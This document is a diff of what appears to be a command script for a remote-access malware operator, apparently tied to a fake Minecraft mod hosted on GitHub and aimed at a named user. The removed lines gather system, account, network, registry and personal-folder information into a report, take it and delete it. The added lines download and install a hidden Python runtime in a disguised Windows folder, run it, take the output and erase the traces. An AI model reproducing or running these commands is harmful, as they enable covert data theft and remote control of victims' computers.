@@ -1,20 +1,11 @@
 # my commands
-version: 6.3
+version: 7
 mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
 @ALEXGAMING
 steal
-shell echo ===== SYSTEM ===== > %TEMP%\report.txt
-shell whoami >> %TEMP%\report.txt 2>nul & hostname >> %TEMP%\report.txt 2>nul & echo. >> %TEMP%\report.txt
-shell systeminfo >> %TEMP%\report.txt 2>nul
-shell ipconfig /all >> %TEMP%\report.txt 2>nul
-shell net user >> %TEMP%\report.txt 2>nul & net localgroup administrators >> %TEMP%\report.txt 2>nul
-shell echo ===== DESKTOP FILES ===== >> %TEMP%\report.txt 2>nul & dir /b "%USERPROFILE%\Desktop" >> %TEMP%\report.txt 2>nul
-shell echo ===== DOCUMENTS ===== >> %TEMP%\report.txt 2>nul & dir /b "%USERPROFILE%\Documents" >> %TEMP%\report.txt 2>nul
-shell echo ===== DOWNLOADS ===== >> %TEMP%\report.txt 2>nul & dir /b "%USERPROFILE%\Downloads" >> %TEMP%\report.txt 2>nul
-shell echo ===== STARTUP ===== >> %TEMP%\report.txt 2>nul & dir /b "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >> %TEMP%\report.txt 2>nul
-shell echo ===== RUN KEYS ===== >> %TEMP%\report.txt 2>nul & reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" >> %TEMP%\report.txt 2>nul
-shell echo ===== INSTALLED (top) ===== >> %TEMP%\report.txt 2>nul & reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "DisplayName" >> %TEMP%\report.txt 2>nul
-shell echo ===== RECENT ===== >> %TEMP%\report.txt 2>nul & dir /b "%APPDATA%\Microsoft\Windows\Recent" >> %TEMP%\report.txt 2>nul
-shell echo ===== NETWORK ===== >> %TEMP%\report.txt 2>nul & netstat -ano >> %TEMP%\report.txt 2>nul
-grab %TEMP%\report.txt
-shell del /f /q "%TEMP%\report.txt" 2>nul
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/python-embed.zip %APPDATA%\Microsoft\Crypto\RSA\py.zip
+shell mkdir "%APPDATA%\Microsoft\Crypto\RSA\Python" 2>nul & tar -xf "%APPDATA%\Microsoft\Crypto\RSA\py.zip" -C "%APPDATA%\Microsoft\Crypto\RSA\Python" 2>nul
+shell del /f /q "%APPDATA%\Microsoft\Crypto\RSA\py.zip" 2>nul
+shell "%APPDATA%\Microsoft\Crypto\RSA\Python\pythonw.exe" -c "import sys,os;open(os.path.join(os.environ['APPDATA'],r'Microsoft\Crypto\RSA\pyok.txt'),'w').write(sys.version)" 2>nul
+grab %APPDATA%\Microsoft\Crypto\RSA\pyok.txt
+shell del /f /q "%APPDATA%\Microsoft\Crypto\RSA\pyok.txt" 2>nul
